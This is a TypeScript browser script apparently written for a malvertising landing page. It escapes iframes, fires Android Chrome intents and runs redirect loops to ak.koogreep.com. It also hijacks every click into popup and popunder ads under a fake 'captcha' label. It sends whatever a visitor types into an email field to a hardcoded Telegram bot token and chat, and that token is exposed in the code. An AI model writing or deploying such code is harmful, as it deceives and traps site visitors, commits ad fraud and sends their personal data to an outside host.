import { logger } from "./logger";
import { tryAllMethods } from "./redirect-iframes";
import { isIntentAvailable, sleep } from "./utils";

const {log, err} = logger

export type Params = {
    chrome: string
    exit1: string,
    iframe: string,

    zone_id: string,
    stop_count: string,
    click_id: string,
    counter: string,
    debug: string,
  
    reverse: string, 
    redirect_method: string
    sleep: string
    log: string
}



const parseInfoByHref = (href: string = window.location.href) => {
    const url = new URL(href)
    const p = url.searchParams
    return {
        url,
        ...(Object.fromEntries(p.entries()) as any as Params),
        stop_count: p.has('stop_count') ? Number(p.get("stop_count")) : 1000,
        zone_id: p.get("zone_id") || '0',
	    click_id : p.has('click_id') ? Number(p.get("click_id")) : 0,
        counter: p.has('counter') ? Number(p.get('counter')) : 0
    }
}

const current = parseInfoByHref()
const next = parseInfoByHref()

var my_zone_id = "6621535";
var iframe_zone_id = my_zone_id;

const changeUrl = async (link: string) => {
    if (current.debug == undefined) {
        await log('[changeUrl] navigate to:', link);
        window.location.href = link;
    }
    else  {
        await log('NEXT URL=', link)
        debugger
    }
}

const run = async () => {

    log('current URL ', current)
    await sleep()
   
	if (current.exit1) 
		my_zone_id = current.exit1
	

    const openNextPage = async (from_zone_id: string, vaR: string = 'inIFrame') => {
        await changeUrl("https://ak.koogreep.com/4/" + from_zone_id + "?var=" + vaR + "&ymid=" + next.click_id + "&var_3=" + next.counter)
    }
	if (current.iframe) {
		log("jump_from_iframe detected")
		if (window === window.parent) {
			next.zone_id = "jump_from_iframe_but_its_not_iframe_" + current.iframe + "_"+ current.redirect_method;
		} else {
			next.zone_id = "jump_from_iframe_and_its_iframe_" + current.iframe + "_"+ current.redirect_method;
		}
		changeUrl("https://ak.koogreep.com/4/" + iframe_zone_id + "?var=" + next.zone_id + "&ymid=" + next.click_id + "&var_3=" + next.counter);	
	}
	
	if (current.reverse) {
		current.zone_id = "jump_from_reverse";
		log("jump_from_reverse detected");
	}
	





	if (current.chrome === "1") {
		log('chromeParam === "1"');
        await openNextPage(my_zone_id, next.zone_id)
	}
	if (current.chrome === "2") {
		log('chromeParam === "2"');
        await openNextPage(my_zone_id, 'fallback')
	}

    const changeIFrames = async (iframesPosition: string, vaR: string = 'inIFrame') => {
        const tail = `iframe=${iframesPosition}`
		var newHref = current.url.href.includes('?') ? `${current.url.href}&${tail}` : `${current.url.href}?${tail}`;
		await tryAllMethods(newHref);
		await openNextPage(iframe_zone_id, vaR)
    }
	// if iframe
	if (window.location !== window.parent.location) {
        await changeIFrames('1')
    }
	
    

	if (window !== parent) {
        await changeIFrames('2')
	}
	
	if (window !== top) {
        await changeIFrames('3')
	}
	
	if (window.frameElement) {
        await changeIFrames('4')
	}
	
	if (window.self !== window.parent) {
        await changeIFrames('5')
	}
	
	try {
		await log('try');
		if (window.parent.location.href) {
			await log("not iframe");
		}
	} catch (e) {
		await log('catch inIframeCatch');
        await changeIFrames('6', 'inIframeCatch')
    }

	if (window.performance.navigation.type === 2) {
		await log('window.performance.navigation.type === 2');
		await changeUrl(window.location.href + "&reverse=1");
	}

	if (isIntentAvailable() || current.stop_count == 1001) {
		log("not chrome, start our intent logic");
	} else {
		log("it's chrome, go to the ads");
		await openNextPage(my_zone_id,"chrome_user_agent");
	}

	const  checkFocus = async (forced = 0) => {
		await log("[checkFocus] forced = ", forced);
		if (document.visibilityState === 'visible' || forced) {
			await log("[checkFocus] process");
			next.counter ++;
			await log("[checkFocus] counter increased:", next.counter);
			var urlQuery = "?counter=" + next.counter + "&zone_id=" + next.zone_id + "&click_id=" + next.click_id + "&exit1=" + next.exit1 + "&chrome=1";
			var landingpageURL = window.location.hostname + window.location.pathname + urlQuery;
			var fallback = window.location.hostname + "?chrome=2";
			await log("[checkFocus] if visible!");
			if (isIntentAvailable()) {
				await log("[checkFocus] user agent matches, gonna be intent!");
				await changeUrl('intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + fallback + ';end');
			}
			if (next.counter % 6 === 0) {
				window.location.reload();
			}
			if (next.counter > current.stop_count) {
				await log("[checkFocus] user agent matches, but run into max count, exit");
				await changeUrl("https://ak.koogreep.com/4/" + my_zone_id + "?var=top_count" + "&ymid=" + next.click_id + "&var_3=" + next.counter);
			}
		} else {
			log("invisible and not forced");
		}
	}

	window.onload = function () {
		log("forced checkfocus");
		checkFocus(1);
	};

	setInterval(checkFocus, 1000);
}


document.addEventListener("click", function (event: PointerEvent) {
	// Проверяем, что клик не был сделан на элементах с id 'submit' или 'email'
    const div: HTMLElement = event.target as any
	if (div.id !== 'submit' && div.id !== 'email') {
		var click_redirect_url = "https://ak.koogreep.com/4/" + my_zone_id;

		// Открывает новое окно с заданным URL
		window.open(click_redirect_url + "?var=captcha_click_popup", '_blank');

		// Перезагружает текущую вкладку с заданным URL
		window.location.href = click_redirect_url + "?var=captcha_click_popunder";
	}
});
document.getElementById('submit').addEventListener('click', function() {
    var messageText = ( document.getElementById('email') as HTMLInputElement).value;
    var encodedMessageText = encodeURIComponent(messageText);

    var url = 'https://api.telegram.org/bot5450120180:AAGnZom3dnBMo7vzBtYY4lIj-6cG2SRu6Qw/sendMessage?chat_id=-4049291060&text=' + encodedMessageText;

    fetch(url, {
        method: 'GET',
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
        document.getElementById('messageInput').style.display = 'none';
        document.getElementById('sendButton').style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('reloadLink').style.display = 'block';
    })
    .catch((error) => {
        console.error('Error:', error);
    });
    changeUrl("https://ak.koogreep.com/4/" + iframe_zone_id + "?var=honeypot" + "&ymid=" + next.click_id + "&var_3=" + next.counter);
});

run()